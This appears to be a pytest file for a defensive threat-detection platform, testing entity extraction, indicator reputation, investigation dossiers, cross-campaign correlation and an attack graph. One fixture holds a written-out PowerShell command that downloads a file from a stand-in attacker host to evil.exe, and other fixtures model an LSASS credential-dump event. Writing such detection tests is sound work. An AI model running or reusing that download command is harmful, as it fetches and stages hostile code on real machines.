"""
Tests for CAIP Phase 6 — Entity Extraction, Threat Intelligence, and Graph Investigation
========================================================================================
Validates:
  • Phase 6.1: Entity Extraction (all 7 types: Domain, IP, Process, User, Device, File, Hash)
  • Phase 6.2: Threat Intelligence Enrichment (check_domain, check_ip, check_process, check_file_hash)
  • Phase 6.3: Internal Threat Intelligence Indicator Table & Telemetry Memory
  • Phase 6.4: Entity Investigation Dossier
  • Phase 6.5: Cross-Campaign Infrastructure Reuse Detection
  • Phase 6.6: Campaign Investigation Graph (Neo4j / Dynamic fallback with LSASS / C2 subtree)
"""

import pytest
from datetime import datetime, timezone
from fastapi.testclient import TestClient

from app.database.database import SessionLocal, Base, engine
from app.database.models import Event as DBEvent, Campaign as DBCampaign, Indicator
from app.intelligence.entity_extractor import EntityExtractor
from app.intelligence.threat_intel import ThreatIntelEngine
from app.main import app


@pytest.fixture
def db_session():
    Base.metadata.create_all(bind=engine)
    session = SessionLocal()
    yield session
    session.close()


@pytest.fixture
def client():
    return TestClient(app)


# ── 1. Phase 6.1 — Entity Extraction ──────────────────────────────────────────
def test_entity_extraction_sysmon_dns_event():
    """Verify extraction of process, domain, device, and user from a Sysmon DNS event."""
    event = {
        "event_type": "dns_query",
        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "domain": "malicious-example.com",
        "device_id": "WORKSTATION-01",
        "user": "CORP\\alice",
        "source_ip": "192.168.1.105",
        "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "file_path": "C:\\Users\\alice\\AppData\\Local\\Temp\\payload.exe",
    }

    entities = EntityExtractor.extract_entities(event)
    extracted_types = {e["type"]: e["value"] for e in entities}

    # Verify all 7 required entity types
    assert "domain" in extracted_types
    assert extracted_types["domain"] == "malicious-example.com"

    assert "ip" in extracted_types
    assert extracted_types["ip"] == "192.168.1.105"

    assert "process" in extracted_types
    assert extracted_types["process"] == "powershell.exe"

    assert "user" in extracted_types
    assert extracted_types["user"] == "alice"

    assert "device" in extracted_types
    assert extracted_types["device"] == "WORKSTATION-01"

    assert "file" in extracted_types
    assert "payload.exe" in extracted_types["file"]

    assert "hash" in extracted_types
    assert extracted_types["hash"] == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"


def test_entity_extraction_fallback_regex():
    """Verify fallback extraction from command line and URLs."""
    event = {
        "event_type": "powershell",
        "command_line": "powershell.exe -c Invoke-WebRequest -Uri http://evil-c2.org:8080/drop -OutFile C:\\Temp\\evil.exe; 10.0.0.55",
        "device_id": "SERVER-DC01",
        "user": "bob"
    }

    entities = EntityExtractor.extract_entities(event)
    doms = [e["value"] for e in entities if e["type"] == "domain"]
    ips = [e["value"] for e in entities if e["type"] == "ip"]

    assert any("evil-c2.org" in d for d in doms)
    assert "10.0.0.55" in ips


# ── 2. Phase 6.2 & 6.3 — Internal Threat Intelligence Memory ──────────────────
def test_threat_intel_learning_and_reputation(db_session):
    """Verify CAIP learns threat indicators from telemetry and calculates reputation."""
    engine = ThreatIntelEngine()

    now = datetime.now(timezone.utc).replace(tzinfo=None)
    ev1 = DBEvent(
        event_id="EVT-TI-001",
        timestamp=now,
        source="Sysmon",
        event_type="dns_query",
        domain="evil-domain.com",
        device_id="WORKSTATION-01",
        user="alice",
        process_name="powershell.exe",
        severity=80,
        security_status="high_risk",
        campaign_id="CAMP-TEST-01"
    )
    db_session.add(ev1)
    db_session.commit()

    # Ingest event 1 into Threat Intel
    indicators = engine.record_event_telemetry(ev1, db_session)
    assert len(indicators) > 0

    # Query domain indicator
    ind_dom = db_session.query(Indicator).filter(Indicator.type == "domain", Indicator.value == "evil-domain.com").first()
    assert ind_dom is not None
    assert ind_dom.sightings == 1
    assert ind_dom.reputation in ["suspicious", "malicious"]
    assert ind_dom.risk_score >= 70

    # Ingest event 2 on a second device with cmd.exe
    ev2 = DBEvent(
        event_id="EVT-TI-002",
        timestamp=now,
        source="Sysmon",
        event_type="http_c2",
        domain="evil-domain.com",
        device_id="FINANCE-PC-02",
        user="charlie",
        process_name="cmd.exe",
        severity=85,
        security_status="critical",
        campaign_id="CAMP-TEST-02"
    )
    db_session.add(ev2)
    db_session.commit()

    engine.record_event_telemetry(ev2, db_session)

    # Check updated indicator memory
    ind_updated = db_session.query(Indicator).filter(Indicator.type == "domain", Indicator.value == "evil-domain.com").first()
    assert ind_updated.sightings == 2
    assert ind_updated.affected_devices == 2
    assert ind_updated.reputation == "malicious"


def test_threat_intel_check_methods(db_session):
    """Verify check_domain, check_ip, check_process, check_file_hash return rich summaries."""
    engine = ThreatIntelEngine()

    # Check known suspicious process
    proc_result = engine.check_process("powershell.exe", db_session)
    assert proc_result["type"] == "process"
    assert proc_result["value"] == "powershell.exe"
    assert proc_result["reputation"] in ["Suspicious", "Malicious"]
    assert len(proc_result["threat_intelligence"]) == 5

    # Check unobserved domain
    dom_result = engine.check_domain("unknown-clean-site.org", db_session)
    assert dom_result["type"] == "domain"
    assert dom_result["sightings"] == 0
    assert any("Not yet observed" in line for line in dom_result["threat_intelligence"])


# ── 3. Phase 6.4 — Entity Investigation Dossier ───────────────────────────────
def test_entity_investigation_dossier(db_session):
    """Verify full 360-degree investigation dossier for an entity."""
    engine = ThreatIntelEngine()
    dossier = engine.get_entity_dossier("domain", "evil-domain.com", db_session)

    assert "entity" in dossier
    assert dossier["entity"]["value"] == "evil-domain.com"
    assert "metrics" in dossier
    assert dossier["metrics"]["events_count"] >= 2
    assert "timeline" in dossier
    assert len(dossier["timeline"]) >= 2
    assert "related_processes" in dossier
    assert "powershell.exe" in dossier["related_processes"]
    assert "cmd.exe" in dossier["related_processes"]


# ── 4. Phase 6.5 — Cross-Campaign Correlation ─────────────────────────────────
def test_cross_campaign_reuse_detection(db_session):
    """Verify detection of shared infrastructure between CAMPAIGN A and CAMPAIGN B."""
    engine = ThreatIntelEngine()

    # Check reuse for CAMP-TEST-01
    reuse = engine.find_cross_campaign_reuse("CAMP-TEST-01", db_session)

    assert reuse["has_reuse"] is True
    assert "cross-campaign infrastructure reuse" in reuse["reuse_alert"].lower()
    assert len(reuse["reused_entities"]) > 0

    reused_domain = next((item for item in reuse["reused_entities"] if item["value"] == "evil-domain.com"), None)
    assert reused_domain is not None
    assert "CAMP-TEST-02" in reused_domain["shared_campaigns"]


# ── 5. Phase 6.6 — Graph Investigation API ────────────────────────────────────
def test_campaign_graph_investigation_view(client, db_session):
    """Verify investigation graph contains User -> Device -> Process -> Domain / LSASS topology."""
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    camp = DBCampaign(
        campaign_id="CAMP-GRAPH-01",
        target="alice",
        attack_type="Credential Theft",
        stage="Execution -> Credential Access",
        confidence=0.92,
        risk="HIGH",
        risk_score=88,
        created_at=now
    )
    db_session.add(camp)

    # Add mimikatz lsass dump event
    ev = DBEvent(
        event_id="EVT-GRAPH-01",
        timestamp=now,
        source="Sysmon",
        event_type="credential_dump",
        process_name="powershell.exe",
        parent_process="cmd.exe",
        domain="c2-server.com",
        source_ip="198.51.100.4",
        device_id="WORKSTATION-01",
        user="alice",
        severity=90,
        security_status="critical",
        detection_rule="LSASS Memory Minidump",
        detection_reason="Process accessed LSASS memory for credentials",
        mitre_technique="T1003",
        campaign_id="CAMP-GRAPH-01"
    )
    db_session.add(ev)
    db_session.commit()

    resp = client.get("/api/v1/campaigns/CAMP-GRAPH-01/graph")
    assert resp.status_code == 200
    data = resp.json()

    nodes = data.get("nodes", [])
    edges = data.get("edges", [])

    node_types = {n["type"] for n in nodes}
    node_names = {n["name"] for n in nodes}

    assert "User" in node_types
    assert "Device" in node_types
    assert "Process" in node_types
    assert "LSASS" in node_names
    assert "Credential Access" in node_names

    edge_types = {e["label"] for e in edges if "label" in e}
    assert "USED_DEVICE" in edge_types
    assert "RAN_PROCESS" in edge_types
    assert "TARGETED" in edge_types
    assert "TECHNIQUE" in edge_types


# ── 6. Dedicated Threat Intelligence API Endpoints ────────────────────────────
def test_intel_api_endpoints(client):
    """Verify HTTP GET endpoints for intel checks, indicators, and dossier."""
    r1 = client.get("/api/v1/intel/check-domain?domain=evil-domain.com")
    assert r1.status_code == 200
    assert r1.json()["value"] == "evil-domain.com"

    r2 = client.get("/api/v1/intel/check-process?process=powershell.exe")
    assert r2.status_code == 200
    assert r2.json()["value"] == "powershell.exe"

    r3 = client.get("/api/v1/indicators")
    assert r3.status_code == 200
    assert isinstance(r3.json(), list)

    r4 = client.get("/api/v1/entities/inspect?type=domain&value=evil-domain.com")
    assert r4.status_code == 200
    assert r4.json()["entity"]["value"] == "evil-domain.com"
